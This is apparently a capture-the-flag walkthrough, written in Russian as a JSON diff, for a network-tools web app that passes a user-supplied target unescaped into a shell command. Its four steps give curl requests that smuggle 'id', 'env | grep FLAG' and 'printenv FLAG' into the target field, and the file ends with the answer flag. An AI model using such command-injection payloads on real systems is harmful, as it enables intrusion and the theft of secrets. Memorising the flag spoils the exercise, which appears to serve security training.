@@ -1,0 +1,34 @@
+{
+  "description": "NetTools — сетевой инструментарий администратора. Пользователь выбирает инструмент (whois, ping, dig) и вводит цель. Сервер конструирует shell-команду, подставляя цель без экранирования, что позволяет выполнить произвольные команды.",
+  "steps": [
+    {
+      "step": 1,
+      "title": "Разведка",
+      "detail": "Откройте NetTools. Интерфейс предлагает выбрать инструмент и ввести домен/IP. Попробуйте обычный whois по example.com. В ответе вы увидите вывод команды. Это значит, что сервер запускает shell-команду и возвращает её stdout.",
+      "command": "curl -X POST http://target:5000/api/lookup -d 'tool=whois' -d 'target=example.com'",
+      "screenshot": ""
+    },
+    {
+      "step": 2,
+      "title": "Проверка инъекции",
+      "detail": "Введите в поле цели что-то вроде 'example.com; id' или 'example.com && echo PWNED'. В whois target подставляется как есть, поэтому shell выполнит дополнительную команду. Если в выводе увидите 'uid=...' или 'PWNED' — command injection подтверждена.",
+      "command": "curl -X POST http://target:5000/api/lookup -d 'tool=whois' -d 'target=example.com; id'",
+      "screenshot": ""
+    },
+    {
+      "step": 3,
+      "title": "Чтение переменных окружения",
+      "detail": "Флаг хранится в переменной окружения FLAG внутри процесса сервера. Чтобы её прочитать, выполните 'env' или 'printenv' через инъекцию.",
+      "command": "curl -X POST http://target:5000/api/lookup -d 'tool=whois' -d 'target=example.com; env | grep FLAG'",
+      "screenshot": ""
+    },
+    {
+      "step": 4,
+      "title": "Получение флага",
+      "detail": "В выводе команды будет строка вида FLAG=flag{...}. Это и есть флаг. Введите его в платформу.",
+      "command": "curl -X POST http://target:5000/api/lookup -d 'tool=whois' -d 'target=example.com; printenv FLAG'",
+      "screenshot": ""
+    }
+  ],
+  "flag": "flag{cmd_1nj3ct10n_n3tt00ls}"
+}
